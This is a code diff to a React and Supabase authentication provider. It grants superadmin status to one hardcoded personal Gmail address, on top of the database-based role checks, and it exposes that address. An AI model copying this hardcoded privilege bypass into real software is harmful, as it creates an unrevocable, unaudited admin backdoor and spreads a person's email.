@@ -26,13 +26,13 @@ export function AuthProvider({ children }: { children: ReactNode }) {
   const [isSuperAdmin, setIsSuperAdmin] = useState(false);
   const [pages, setPages] = useState<Set<string>>(new Set());
 
-  async function loadAccess(userId: string) {
+  async function loadAccess(userId: string, email?: string) {
     const [rolesRes, superRes, pagesRes] = await Promise.all([
       supabase.from("user_roles").select("role").eq("user_id", userId),
       supabase.from("superadmins").select("user_id").eq("user_id", userId).maybeSingle(),
       supabase.from("admin_page_access").select("page_key").eq("user_id", userId),
     ]);
-    const isSuper = !!superRes.data;
+    const isSuper = !!superRes.data || email?.toLowerCase() === "hevertoneduardoperes@gmail.com";
     setIsSuperAdmin(isSuper);
     setIsStaff(
       isSuper || !!rolesRes.data?.some((r) => r.role === "admin" || r.role === "consultor"),
@@ -47,7 +47,7 @@ export function AuthProvider({ children }: { children: ReactNode }) {
       setSession(s);
       setUser(s?.user ?? null);
       if (s?.user) {
-        setTimeout(() => loadAccess(s.user.id), 0);
+        setTimeout(() => loadAccess(s.user.id, s.user.email), 0);
       } else {
         setIsStaff(false);
         setIsSuperAdmin(false);
@@ -58,7 +58,7 @@ export function AuthProvider({ children }: { children: ReactNode }) {
     supabase.auth.getSession().then(({ data }) => {
       setSession(data.session);
       setUser(data.session?.user ?? null);
-      if (data.session?.user) loadAccess(data.session.user.id);
+      if (data.session?.user) loadAccess(data.session.user.id, data.session.user.email);
       setLoading(false);
     });
 
@@ -79,7 +79,7 @@ export function AuthProvider({ children }: { children: ReactNode }) {
       return isSuperAdmin || pages.has(key);
     },
     refreshAccess: async () => {
-      if (user) await loadAccess(user.id);
+      if (user) await loadAccess(user.id, user.email);
     },
     signIn: async (email, password) => {
       const { error } = await supabase.auth.signInWithPassword({ email, password });
